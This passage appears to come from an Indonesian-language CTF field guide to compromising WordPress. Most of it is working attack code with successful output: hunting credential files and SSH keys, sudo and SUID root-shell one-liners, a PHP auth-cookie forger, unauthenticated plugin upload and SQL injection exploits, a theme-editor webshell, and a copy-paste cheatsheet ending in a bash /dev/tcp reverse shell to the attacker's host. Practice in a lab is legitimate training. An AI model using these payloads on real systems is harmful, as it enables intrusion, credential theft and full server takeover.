$P$B91/K729E4y5eN8/70fE4X4e0.w4.z0:password123
```

➡️ Test password reuse ke service lain!

---

### Langkah 5.3 — File Hunting & Lateral Movement

Bash

```
# Dari shell target:

# Step 1: Cari file sensitif
find /var/www/html/ -type f \( -name "*.bak" -o -name "*.old" -o -name "*.sql" \
    -o -name "debug.log" -o -name "*.zip" -o -name ".env" \) 2>/dev/null

# Step 2: Cari credential di semua config
find /var/www/ -name "*.php" -readable 2>/dev/null \
    | xargs grep -iE "(password|passwd|secret|api_key|token)" 2>/dev/null \
    | grep -v "//\|#\|wp-login\|update\|wp-setting" | head -30

# Step 3: Cek SSH keys
ls -la /home/*/.ssh/ 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null
cat /home/*/.ssh/authorized_keys 2>/dev/null

# Step 4: Cek users yang ada di sistem
cat /etc/passwd | grep -v "nologin\|false" | cut -d: -f1

# Step 5: Coba password reuse dari wp-config.php ke system users
su - user_from_passwd  # masukkan DB_PASSWORD atau WP admin password
```

**OUTPUT BERHASIL ✅ — SSH key ditemukan:**

text

```
/home/john/.ssh/id_rsa
```

Bash

```
# Copy key, set permission
cat /home/john/.ssh/id_rsa
# Paste ke Parrot OS
chmod 600 ~/wp_loot/keys/john_id_rsa

# Login via SSH
ssh -i ~/wp_loot/keys/john_id_rsa john@$TARGET_IP
```

➡️ Ke **[06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh)** untuk full SSH workflow

---

### Langkah 5.4 — Privilege Escalation dari www-data

Bash

```
# Cek sudo rights
sudo -l

# Cek SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Cek capabilities
getcap -r / 2>/dev/null

# Cek crontab
cat /etc/crontab
ls -la /etc/cron*
crontab -l 2>/dev/null

# Cek writable directories dengan interesting scripts
find / -writable -type f -name "*.sh" 2>/dev/null | head -20
find / -writable -type f 2>/dev/null | grep -v "proc\|sys\|dev" | head -20
```

**OUTPUT BERHASIL ✅ — Sudo NOPASSWD ditemukan:**

text

```
User www-data may run the following commands on wordpress:
    (root) NOPASSWD: /usr/bin/vim
```

➡️ `sudo vim -c ':!/bin/bash'` → **ROOT SHELL!**

**OUTPUT BERHASIL ✅ — SUID binary:**

text

```
/usr/bin/python3.8
```

➡️ `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

➡️ Jika tidak ketemu jalan mudah: ke **[🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc)**

---

## ═══════════════════════════════════════

## FASE 6: PATH ALTERNATIF — REST API & COOKIE FORGERY

## ═══════════════════════════════════════

### Langkah 6.1 — REST API Content Injection (WordPress < 4.7.2 — CVE-2017-1001000)

Bash

```
# Konfirmasi versi vulnerable
echo "[*] WordPress version: $WP_VERSION"

# Exploit: Modifikasi post tanpa autentikasi
curl -X POST "$TARGET/wp-json/wp/v2/posts/1" \
    -H "Content-Type: application/json" \
    -d '{"id": "1abc", "content": "<?php system($_GET[\"cmd\"]); ?>"}'
```

**OUTPUT BERHASIL ✅:**

JSON

```
{"id": 1, "content": {"rendered": "<?php system($_GET[\"cmd\"]); ?>"}}
```

---

### Langkah 6.2 — Cookie Forgery (Jika dapat wp-config.php dengan salt keys)

> Prasyarat: Dapat `LOGGED_IN_KEY`, `LOGGED_IN_SALT`, username, dan 4 karakter hash password

Bash

```
# Buat script PHP untuk forge cookie
cat > /tmp/forge_cookie.php << 'EOF'
<?php
$username    = 'admin';
$expiration  = time() + (86400 * 7);
$site_url    = 'http://10.10.11.200';

// Dari wp-config.php
$logged_in_key  = 'PASTE_LOGGED_IN_KEY_DISINI';
$logged_in_salt = 'PASTE_LOGGED_IN_SALT_DISINI';
$key = $logged_in_key . $logged_in_salt;

// 4 karakter dari hash database (index 8-12)
// Contoh hash: $P$B91/K729E4y5eN8/70fE4X4e0.w4.z0
$full_hash  = '$P$B91/K729E4y5eN8/70fE4X4e0.w4.z0';
$pass_frag  = substr($full_hash, 8, 4);

$hash       = hash_hmac('md5', $username . '|' . $expiration . '|' . $pass_frag, $key);
$cookie_val = $username . '|' . $expiration . '|' . $hash;
$cookie_name = "wordpress_logged_in_" . md5($site_url);

echo "Cookie Name : " . $cookie_name . "\n";
echo "Cookie Value: " . $cookie_val . "\n";
echo "Curl Command: curl -b \"" . $cookie_name . "=" . $cookie_val . "\" " . $site_url . "/wp-admin/\n";
?>
EOF

php /tmp/forge_cookie.php
```

**OUTPUT BERHASIL ✅:**

text

```
Cookie Name : wordpress_logged_in_a1b2c3d4e5f6...
Cookie Value: admin|1773000000|c4ca4238a0b923...
Curl Command: curl -b "wordpress_logged_in_...=admin|1773000000|..." http://10.10.11.200/wp-admin/
```

Bash

```
# Test akses dengan forged cookie
curl -s -b "wordpress_logged_in_HASH=admin|EXPIRY|TOKEN" \
    "$TARGET/wp-admin/" | grep -i "dashboard\|howdy"
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error / Situasi|Penyebab|Solusi|
|---|---|---|
|`403` pada `wp-admin/`|IP whitelist atau firewall|Cek apakah ada SSRF untuk akses internal, atau proxychains|
|WPScan timeout|WAF rate limiting|`--throttle 2000 --max-threads 5`|
|Nonce kosong saat extract|Cookie expired / tema tidak ada 404.php|Re-login, atau coba file tema lain|
|Plugin upload gagal (size)|`upload_max_filesize` kecil|Buat plugin minimal, compress lebih kecil|
|Theme editor disabled|`DISALLOW_FILE_EDIT=true`|Gunakan malicious plugin upload|
|XML-RPC multicall return faultCode 405|Plugin disable XML-RPC|Switch ke wp-login brute force|
|Login redirect loop|Cookie tidak tersimpan|Tambah `-b "wordpress_test_cookie=WP+Cookie+check"`|
|`www-data` shell, tidak bisa baca file|Permission denied|Cari SUID, sudo, atau cronjob untuk eskalasi|
|Hash phpass tidak tercrack|Password kompleks|Coba rules: `OneRuleToRuleThemAll.rule`, atau langsung UPDATE di database|
|REST API blocked|Plugin disable REST|Pivot ke XML-RPC, atau parse HTML manual|
|WPScan API limit|50 req/day gratis|Jalankan tanpa `--api-token`, atau daftar akun baru di wpscan.io|
|Shell langsung closed|Firewall outbound|Gunakan port 80, 443, atau 8080 untuk listener|
|xmlrpc.php = 404|Apache/Nginx block di .htaccess|Tidak bisa bypass ini, fokus ke wp-login atau plugin vuln|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: WordPress Terdeteksi
│
├─ FASE 0: Konfirmasi WP & Versi
│   └─ Versi < 4.7.2 → CVE-2017-1001000 REST API Injection (langsung RCE)
│   └─ Versi < 5.0.0 dengan user Author → CVE-2019-8942 Crop RCE
│
├─ FASE 1: Reconnaissance
│   ├─ [Plugin vulnerable ditemukan] → FASE 3 (Plugin Exploit)
│   ├─ [wp-config.php.bak exposed] → FASE 4C (DB Creds → Admin Override)
│   ├─ [Username ditemukan] → FASE 2 (Auth)
│   └─ [XML-RPC aktif] → FASE 2B (Multicall Brute Force)
│
├─ FASE 2: Authentication
│   ├─ [Default creds bekerja] → FASE 4 (Admin → Shell)
│   ├─ [Brute force berhasil] → FASE 4 (Admin → Shell)
│   └─ [CAPTCHA/lockout] → FASE 3 (Plugin vuln tanpa auth)
│
├─ FASE 3: Plugin Exploitation (Pre-Auth)
│   ├─ [WP File Manager <= 6.8] → Connector upload → Shell
│   ├─ [Ultimate Member < 2.6.7] → Register admin → FASE 4
│   ├─ [WP Automatic < 3.92.0] → SQL Inject → Update password → FASE 4
│   └─ [Contact Form 7 < 5.3.2] → File upload → Shell
│
├─ FASE 4: Admin → Shell
│   ├─ Theme editor enabled → 404.php inject → Shell
│   ├─ Theme editor disabled → Malicious plugin upload → Shell
│   └─ DB accessible → Password override → Login → Shell
│
└─ FASE 5: Post-Exploitation
    ├─ [wp-config.php creds] → Test reuse ke SSH/MySQL/FTP
    ├─ [Hash didapat] → Crack → Reuse
    ├─ [SSH key ditemukan] → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
    ├─ [sudo/SUID] → PrivEsc → <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
    └─ [Database creds] → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="http://10.10.11.200"
export TARGET_IP="10.10.11.200"
export LHOST="10.10.14.5"
export LPORT="4444"
export WP_USER=""
export WP_PASS=""
export ACTIVE_THEME="twentytwenty"
mkdir -p ~/wp_loot/{files,creds,keys,shells,hashes}

# === RECON CEPAT (30 DETIK) ===
curl -s "$TARGET" | grep -i "generator\|wp-content"    # Detect WP & version
curl -s "$TARGET/feed/" | grep -oP '(?<=\?v=)[0-9.]+'  # Versi via feed
curl -s -X POST "$TARGET/xmlrpc.php" -d "<methodCall><methodName>demo.sayHello</methodName></methodCall>"  # XML-RPC check
curl -s "$TARGET/wp-json/wp/v2/users" | jq -r '.[].slug'  # User enum
curl -s -o /dev/null -w "%{http_code}" "$TARGET/wp-config.php.bak"  # Backup file check

# === WPSCAN ===
wpscan --url "$TARGET" --enumerate vp,vt,u --plugins-detection aggressive --api-token "$WPSCAN_API_KEY" -o ~/wp_loot/wpscan.json

# === BRUTE FORCE ===
wpscan --url "$TARGET" -U ~/wp_loot/creds/users.txt -P /usr/share/wordlists/rockyou.txt --password-attack xmlrpc-multicall

# === PLUGIN EXPLOIT (UNAUTH) ===
# WP File Manager 6.0-6.8:
curl -ks -X POST -F "cmd=upload" -F "target=l1_Lw" -F "upload[]=@/tmp/shell.php" "$TARGET/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
# WP Automatic (SQL Inject):
curl -X POST "$TARGET/wp-content/plugins/wp-automatic/inc/csv.php" -d "q=UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID=1"

# === ADMIN → SHELL ===
# Login
curl -s -c cookies.txt -b "wordpress_test_cookie=WP+Cookie+check" -X POST "$TARGET/wp-login.php" -d "log=$WP_USER&pwd=$WP_PASS&wp-submit=Log+In&testcookie=1"
# Get nonce
NONCE=$(curl -s -b cookies.txt "$TARGET/wp-admin/theme-editor.php?file=404.php&theme=$ACTIVE_THEME" | grep -oP 'id="_wpnonce"\s+value="\K[a-f0-9]+' | head -1)
# Inject
curl -s -b cookies.txt -X POST "$TARGET/wp-admin/theme-editor.php" -d "action=update&file=404.php&theme=$ACTIVE_THEME&newcontent=<?php system(\$_GET['cmd']); ?>&_wpnonce=$NONCE&submit=Update+File"
# Trigger
curl -s "$TARGET/wp-content/themes/$ACTIVE_THEME/404.php?cmd=id"
# Reverse shell
nc -lvnp $LPORT & curl -s "$TARGET/wp-content/themes/$ACTIVE_THEME/404.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"

# === HASH CRACKING ===
hashcat -m 400 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --format=phpass hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# === CROSS-SERVICE REUSE ===
# Dari WP creds, test ke:
ssh $WP_USER@$TARGET_IP                           # → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
ftp $TARGET_IP (user: $WP_USER pass: $WP_PASS)   # → <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
mysql -h $TARGET_IP -u $DB_USER -p$DB_PASS        # → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
```

---

## 🔗 CROSS-SERVICE CHART

text

```
WordPress Shell Obtained
     │
     ├─ ─→ wp-config.php DB creds → MySQL (port 3306)  → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
     ├──→ wp-config.php DB creds → SSH password reuse → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
     ├──→ Hash dari wp_users     → Crack → SSH/FTP reuse
     ├──→ SSH key di /home/user  → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
     ├──→ www-data shell         → Linux PrivEsc       → <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
     └──→ Debug.log / other apps → Check other services pada <a href="/docs/web-recon" class="text-[#00b4d8] hover:underline font-mono font-semibold">15_web_recon_workflow.md</a>
```

---

> **➡️ NEXT:** Setelah WordPress selesai, lanjut ke **[📘 17b — Joomla Workflow: Deep Dive untuk CTF](/docs/joomla)** — arsitektur berbeda tapi konsep similar: admin panel `/administrator/`, extension exploit, dan `configuration.php` sebagai target utama.